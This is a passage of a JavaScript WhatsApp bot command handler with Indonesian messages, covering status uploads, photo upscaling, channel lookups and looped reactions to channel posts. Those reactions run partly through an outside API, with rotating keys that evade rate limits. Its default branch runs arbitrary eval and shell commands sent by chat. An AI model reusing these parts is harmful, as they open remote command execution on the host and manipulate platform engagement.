        });

        const messageSecret = require("crypto").randomBytes(32);

        const msg = generateWAMessageFromContent(
            idGrup,
            {
                messageContextInfo: { messageSecret },
                groupStatusMessageV2: {
                    message: {
                        ...inside,
                        messageContextInfo: { messageSecret }
                    }
                }
            },
            {}
        );

        await sock.relayMessage(idGrup, msg.message, {
            messageId: msg.key.id
        });

        await sock.sendMessage(m.chat, {
            react: { text: "✅", key: m.key }
        });

        m.reply(`
✅ *Berhasil upload ke status grup!* ${idGrup}`);

    } catch (err) {
        console.error(err);
        m.reply("❌ Gagal upload ke status grup!");
    }
}
break;

case 'upsw':
case 'upswpribadi': {
    try {
        const q = m.quoted;
        const input =
            args.join(" ") ||
            q?.caption ||
            "";

        if (!input && !q) {
            return m.reply(
`📖 *Cara Upload Status Pribadi*
• ${prefix + command} teks
• Reply media + ${prefix + command}`
            );
        }

        let mime = (q?.msg || q)?.mimetype || "";
        let buffer, content;

        if (q && /image|video|audio/.test(mime)) {
            buffer = await q.download();
        }

        if (buffer) {
            if (/image/.test(mime)) {
                content = { image: buffer, caption: input };
            } else if (/video/.test(mime)) {
                content = { video: buffer, caption: input };
            } else if (/audio/.test(mime)) {
                content = { audio: buffer, mimetype: "audio/mpeg" };
            }
        } else {
            content = { text: input };
        }

        const {
            generateWAMessageContent,
            generateWAMessageFromContent
        } = require("@whiskeysockets/baileys");

        const inside = await generateWAMessageContent(content, {
            upload: sock.waUploadToServer
        });

        const msg = generateWAMessageFromContent(
            "status@broadcast",
            inside,
            {}
        );
        
        await sock.relayMessage(
            "status@broadcast",
            msg.message,
            { messageId: msg.key.id }
        );

        await sock.sendMessage(m.chat, {
            react: { text: "✅", key: m.key }
        });

        m.reply("✅ *Status pribadi berhasil diupload (UMUM)*");

    } catch (err) {
        console.error(err);
        m.reply("❌ Gagal upload status pribadi!");
    }
}
break;

case 'hd': {
    try {
        if (!quoted) return ReplyButton('❌ Reply foto dulu')
        if (!/image/.test(mime)) return reply('❌ Itu bukan foto')

        reply('⏳ Memproses HD...')

        const sharp = require('sharp')
        const media = await quoted.download()

        // HD FIX (AMAN SEMUA FOTO)
        const result = await sharp(media)
            .resize({
                width: 3000,
                fit: 'inside',
                withoutEnlargement: false
            })
            .jpeg({
                quality: 100,
                chromaSubsampling: '4:4:4'
            })
            .toBuffer()

        await sock.sendMessage(
            m.chat,
            {
                image: result,
                caption: '✅ Foto berhasil di HD-kan'
            },
            { quoted: m }
        )

    } catch (err) {
        console.error(err)
        ReplyButton('❌ Gagal memproses foto')
    }
}
break

case 'cekidch': {
 if (!text) return ReplyButton(`Example: ${prefix + command} <Link>`)
 if (!text.includes("https://whatsapp.com/channel/")) return ReplyButton("Link tautan tidak valid")

 let result = text.split('https://whatsapp.com/channel/')[1]
 let res = await sock.newsletterMetadata("invite", result)
 
 let teks = `* *ID : ${res.id}*
* *Nama :* ${res.name}
* *IdCh :* ${res.id}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: { 
 "messageContextInfo": { 
 "deviceListMetadata": {}, 
 "deviceListMetadataVersion": 2 
 },
 interactiveMessage: {
 body: {
 text: teks 
 }, 
 footer: {
 text: `© XEROVANG VERSION 4`
 },
 nativeFlowMessage: {
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
 },
 ]
 }
 }
 }
 }
 }, { quoted: lol }); // Menambahkan {quoted: qmime} di sini
 await sock.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
break

case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return ReplyButton (`𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚𝐧 𝐈𝐦𝐚𝐠𝐞 𝐨𝐫 𝐕𝐢𝐝𝐞𝐨 𝐰𝐢𝐭𝐡 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return ReplyButton('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return ReplyButton('Failed to download media!');
    }

    const uploadImage = require('./leoo/Data1');
    const uploadFile = require('./leoo/Data2');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return ReplyButton('𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐮𝐩𝐥𝐨𝐚𝐝 𝐦𝐞𝐝𝐢𝐚!');
    }

    sock.sendMessage(m.chat, {
        text: `(no expiration date/unknown)\n ${link}`
    }, { quoted: m });
}
break

case 'reactch':
case 'reactchannel': {
    try {
        if (!m.isGroup) return m.reply("❌ Command ini hanya bisa dipakai di grup!")

        const args = m.text.split(' ')
        if (args.length < 3) {
            return m.reply(
                `📖 *Cara Menggunakan React Channel*\n\n` +
                `• ${prefix}reactch <link_channel> <emoji>\n` +
                `• ${prefix}reactch <link_channel> <emoji> <loop> <delay>\n\n` +
                `Contoh:\n` +
                `${prefix}reactch https://whatsapp.com/channel/xxxx 👍 10 2`
            )
        }

        const channelLink = args[1]
        const emoji = args[2]
        let loopCount = parseInt(args[3]) || 1
        let delaySeconds = parseInt(args[4]) || 1

        if (loopCount > 50) loopCount = 50
        if (delaySeconds > 10) delaySeconds = 10

        const emojiRegex = /(\p{Emoji_Presentation}|\p{Emoji}\uFE0F)/gu
        if (!emojiRegex.test(emoji)) {
            return m.reply("❌ Emoji tidak valid!")
        }

        let channelId = ""
        const match = channelLink.match(/channel\/([A-Za-z0-9_-]+)/)
        if (match) channelId = match[1]
        if (!channelId) return m.reply("❌ Link channel tidak valid!")

        // ===== KONFIRMASI BUTTON =====
        await sock.sendMessage(m.chat, {
            text:
                `📢 *Konfirmasi React Channel*\n\n` +
                `📌 Channel: \`${channelId}\`\n` +
                `🎯 Emoji: ${emoji}\n` +
                `🔄 Loop: ${loopCount}\n` +
                `⏱️ Delay: ${delaySeconds}s\n\n` +
                `Pilih tombol di bawah 👇`,
            buttons: [
                {
                    buttonId: 'reactch_yes',
                    buttonText: { displayText: '✅ YA, LANJUTKAN' },
                    type: 1
                },
                {
                    buttonId: 'reactch_no',
                    buttonText: { displayText: '❌ TIDAK, BATAL' },
                    type: 1
                }
            ],
            headerType: 1
        })

        const confirmed = await new Promise((resolve) => {
            const timeout = setTimeout(() => {
                sock.ev.off('messages.upsert', listener)
                resolve(false)
            }, 30000)

            const listener = (upsert) => {
                if (!upsert.messages || !upsert.messages[0]) return
                const msg = upsert.messages[0]

                if (msg.key.fromMe) return
                if (msg.key.remoteJid !== m.chat) return

                const sender = msg.key.participant || msg.key.remoteJid
                if (sender !== m.sender) return

                const btn =
                    msg.message?.buttonsResponseMessage?.selectedButtonId

                if (!btn) return

                clearTimeout(timeout)
                sock.ev.off('messages.upsert', listener)
                resolve(btn === 'reactch_yes')
            }

            sock.ev.on('messages.upsert', listener)
        })

        if (!confirmed) {
            return m.reply("❌ React channel dibatalkan oleh user.")
        }

        // ===== PROSES REACT =====
        const channelJid = `${channelId}@newsletter`

        let success = 0
        let failed = 0

        for (let i = 0; i < loopCount; i++) {
            try {
                await sock.sendMessage(channelJid, {
                    react: {
                        text: emoji,
                        key: {
                            remoteJid: channelJid,
                            fromMe: true,
                            id: `react_${Date.now()}`
                        }
                    }
                })
                success++
            } catch {
                failed++
            }

            if (i < loopCount - 1) {
                await new Promise(r => setTimeout(r, delaySeconds * 1000))
            }
        }

        m.reply(
            `🎉 *React Channel Selesai*\n\n` +
            `✅ Berhasil: ${success}\n` +
            `❌ Gagal: ${failed}`
        )

    } catch (e) {
        console.error(e)
        m.reply("❌ Terjadi error saat react channel.")
    }
}
break

async function reactToPost(postUrl, emojis) {
  let currentTokenIndex = 0;
  
  let attempts = 0;

  while (attempts < global.tokens.length) {

    const apiKey = global.tokens[currentTokenIndex];

    try {

      const response = await axios({

        method: 'POST',

        url: `https://foreign-marna-sithaunarathnapromax-9a005c2e.koyeb.app/api/channel/react-to-post?apiKey=${apiKey}`,

        headers: { 'content-type': 'application/json' },

        data: { post_link: postUrl, reacts: emojis }

      });

      return { success: true };

    } catch (e) {

      const msg = e.response?.data?.message || "";

      if (e.response?.status === 402 || msg.includes("limit") || msg.includes("Limit")) {

        currentTokenIndex = (currentTokenIndex + 1) % global.tokens.length;

        attempts++;

        continue;

      }

      return { success: false };

    }

  }

  return { success: false };

}

case 'reactch': {
    if (!q) return m.reply(
`❗ ☇ *Format Tidak Valid / Invalid Format*

Gunakan format berikut:
• *${prefix + command} <link_post> <emoji>*
Contoh:
• *${prefix + command} https://whatsapp.com/channel/0029Vai2z6I2kNFonTn6qR3a/4268 🫶🤍😻🫰😍*

Use this format:
• *${prefix + command} <post_link> <emoji>*
Example:
• *${prefix + command} https://whatsapp.com/channel/0029Vai2z6I2kNFonTn6qR3a/4268 🫶🤍😻🫰😍*`
    );
    
    const [postUrl, emojiString] = q.split(' ', 2);

    if (!postUrl || !emojiString) {
        return m.reply(
`❗ ☇ *Format Tidak Valid / Invalid Format*

Gunakan format berikut:
• *${prefix + command} <link_post> <emoji>*
Contoh:
• *${prefix + command} https://whatsapp.com/channel/0029Vai2z6I2kNFonTn6qR3a/4268 🫶🤍😻🫰😍*

Use this format:
• *${prefix + command} <post_link> <emoji>*
Example:
• *${prefix + command} https://whatsapp.com/channel/0029Vai2z6I2kNFonTn6qR3a/4268 🫶🤍😻🫰😍*`
        );
    }

    const emojis = [...emojiString.matchAll(/\p{Extended_Pictographic}/gu)].map(e => e[0]);

    if (!postUrl.startsWith('https://whatsapp.com/channel/')) {
        return m.reply(
`❌ ☇ *Link Tidak Valid / Invalid Link*

Pastikan link dimulai dengan: *https://whatsapp.com/channel/*
Contoh: *https://whatsapp.com/channel/0029Vai2z6I2kNFonTn6qR3a/4268*

Make sure the link starts with: *https://whatsapp.com/channel/*
Example: *https://whatsapp.com/channel/0029Vai2z6I2kNFonTn6qR3a/4268*`
        );
    }

    const parts = postUrl.split('/');
    const postId = parts.at(-1);

    if (!postId || isNaN(postId)) {
        return m.reply(
`❌ ☇ *Link Post Salah / Wrong Post Link*

Itu adalah link channel, bukan link post!
Gunakan link post yang berisi ID angka di akhir.

That's a channel link, not a post link!
Use a post link containing a numeric ID at the end.`
        );
    }

    m.reply('⏳ ☇ *Memproses ReactCh... / Processing ReactCh...*');

    try {
        const res = await reactToPost(postUrl, emojis);

        if (res.success) {
            return m.reply(
`✅ ☇ *Reaksi Berhasil Dikirim / Reaction Successfully Sent*

📌 ☇ *Link Post:* ${postUrl}
🎭 ☇ *Emoji:* ${emojis.join(' ')}
✅ Status: Berhasil mengirim reaksi ke post channel.

📌 ☇ *Post Link:* ${postUrl}
🎭 ☇ *Emoji:* ${emojis.join(' ')}
✅ Status: Successfully sent reaction to channel post.`
            );
        } else {
            return m.reply(
`❌ ☇ *Gagal Mengirim Reaksi / Failed to Send Reaction*

Terjadi kesalahan saat mengirim reaksi.
An error occurred while sending the reaction.`
            );
        }

    } catch (err) {
        return m.reply(
`❌ ☇ *Error / Error*

Gagal mengirim reaksi.
Failed to send reaction.

📝 Detail:
${err?.response?.data?.message || err?.message || err}`
        );
    }
}
break;

default:
if (budy.startsWith('=>')) {
if (!CreatorOnly) return

function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!CreatorOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}

if (budy.startsWith('$')) {
if (!CreatorOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
sock.sendMessage(m.chat, {
text: require('util').format(err)
}, { quoted: m })
console.log('\x1b[1;31m' + err + '\x1b[0m')
}
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})